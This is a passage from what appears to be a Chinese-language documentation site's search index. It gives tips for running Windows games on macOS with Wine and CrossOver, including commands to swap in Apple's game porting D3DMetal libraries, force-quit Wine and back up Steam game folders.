\u4e2d\u8bbe\u7f6e\u4ee5\u4e0b\u73af\u5883\u6307\u4ee4\u540e\u518d\u542f\u52a8\uff1a</p> <pre><code>set lang=zh_cn\n</code></pre>"},{"location":"tools/wine/#gtk-2","title":"GTK 2","text":"<p>\u7b80\u4ecb\u91cc\u5df2\u63d0\u4f9b\u4e86\u4e0b\u8f7d\u94fe\u63a5\uff0c\u5b9e\u6d4b\u9700\u4f7f\u7528 Safari \u624d\u80fd\u6b63\u5e38\u4e0b\u8f7d\uff0c\u6302\u8f7d\u540e\u4f1a\u770b\u5230 <code>Evaluation environment for Windows games 2.0.dmg</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u540c\u610f\u542f\u52a8\u4f1a\u81ea\u52a8\u6ce8\u5165\u7cfb\u7edf\u73af\u5883\u53d8\u91cf\uff0c\u540c\u610f\u6253\u5f00\u540e\u4f1a\u770b\u5230\u4e00\u4e2a <code>Read Me.rtf</code> \u6587\u4ef6\uff0c\u6253\u5f00\u540e\u590d\u5236 CrossOver \u6807\u9898\u4e0b\u7684\u6307\u4ee4\u5728 Terminal \u4e2d\u7c98\u8d34\u4e00\u4ef6\u66ff\u6362 CrossOver \u4e2d\u7684\u517c\u5bb9\u5c42:</p> <pre><code>cd /Applications/CrossOver.app/Contents/SharedSupport/CrossOver/lib64/apple_gptk/external\nmv D3DMetal.framework D3DMetal.framework-old; mv libd3dshared.dylib libd3dshared.dylib-old\nditto /Volumes/Evaluation\\ environment\\ for\\ Windows\\ games\\ 2.0/redist/lib/external/ .\n</code></pre>"},{"location":"tools/wine/#others","title":"Others","text":"<p>Steam \u89d2\u6807\u5728\u5f3a\u5236\u9000\u51fa\u4e4b\u540e\u4f9d\u7136\u4f1a\u5728\u53f3\u4e0a\u89d2\u6b8b\u7559\uff0c\u56e0\u6b64\u6700\u597d\u624b\u52a8\u91cd\u542f\u5bb9\u5668\uff0c\u5c11\u6570\u60c5\u51b5\u4e0b\u4f7f\u7528\u5de6\u4e0a\u89d2\u82f9\u679c\u56fe\u6807\u5f3a\u5236\u9000\u51fa\u6216\u6267\u884c\uff1a</p> <pre><code>pkill -f wine\n</code></pre> <p>Steam \u6e38\u620f\u4e0b\u8f7d\u5b8c\u6bd5\u540e\u5c06 steamapps/common \u6587\u4ef6\u5939\u76f8\u5173\u6587\u4ef6\u4f5c\u786c\u76d8\u5907\u4efd</p>"}]}